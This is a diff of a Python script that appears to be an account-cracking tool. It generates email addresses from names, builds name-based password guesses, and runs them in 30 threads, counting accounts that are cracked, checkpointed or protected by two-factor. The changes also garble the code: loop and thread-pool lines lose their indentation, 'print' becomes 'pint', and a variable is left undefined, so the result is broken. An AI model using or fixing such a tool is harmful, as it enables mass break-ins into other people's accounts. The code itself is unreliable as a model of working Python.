@@ -6,17 +6,17 @@ import os
 try:
 	import requests
 except ImportError:
-	print('\n [×] requests module not installed!...\n')
+	print('\n [] requests module not installed!...\n')
 	os.system('pip install requests')
 try:
 	import concurrent.futures
 except ImportError:
-	print('\n [×] Futures module not installed!...\n')
+	print('\n [] Futures module not installed!...\n')
 	os.system('pip install futures')
 try:
 	import bs4
 except ImportError:
-	print('\n [×] Bs4 module not installed!...\n')
+	print('\n [] Bs4 module not installed!...\n')
 	os.system('pip install bs4')
 import os
 import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
@@ -632,12 +632,6 @@ def gmail():
                         mail = ''.join(random.choice(string.digits) for _ in range(4))
                         open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
         fo = open('.re.txt', 'r').read().splitlines()
-        print(' All method working try 1 by 1 ')
-        linex()
-        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
-        linex()
-        zew = input(' Choose method: ')
-        linex()
         print(' Do you went show cp account? (y/n): ')
         linex()
         cx=input(' Choose: ')
@@ -648,12 +642,17 @@ def gmail():
         linex()
         with tred(max_workers=30) as yaari:
                 tl = str(len(fo))
-                os.system('clear');print(logo)
-                print(' Total account : \033[1;32m'+tl)
-                print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
-                linex()
-		zee = zew
-                for user in fo:
+print(' All method working try 1 by 1 ')
+linex()
+print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+linex()
+zew = input(' Choose method: ')
+linex()
+os.system('clear');print(logo)
+print(' Total account : \033[1;32m'+tl)
+print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+linex()
+for user in fo:
                         ids,names = user.split('|')
                         first_name = names.rsplit(' ')[0]
                         try:
@@ -663,19 +662,19 @@ def gmail():
                         fs = first_name.lower()
                         ls = last_name.lower()
                         passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-			if zee in ['1','01']:
-				yaari.submit(m1,ids,passlist)
-			elif zee in ['2','02']:
+if zee in ['1','01']:
+		yaari.submit(m1,ids,passlist)
+elif zee in ['2','02']:
 				yaari.submit(m2,ids,passlist)
-			else:
+else:
 				yaari.submit(m1,ids,passlist)
-        print('\033[1;37m')
-        linex()
-        print(' The process has completed')
-        print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
-        linex()
-        input(' Press enter to back ')
-        os.system('python azeem.py')
+print('\033[1;37m')
+linex()
+print(' The process has completed')
+pint(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+linex()
+input(' Press enter to back ')
+os.system('python azeem.py')
 	
 def zee1():
 	os.system('clear')
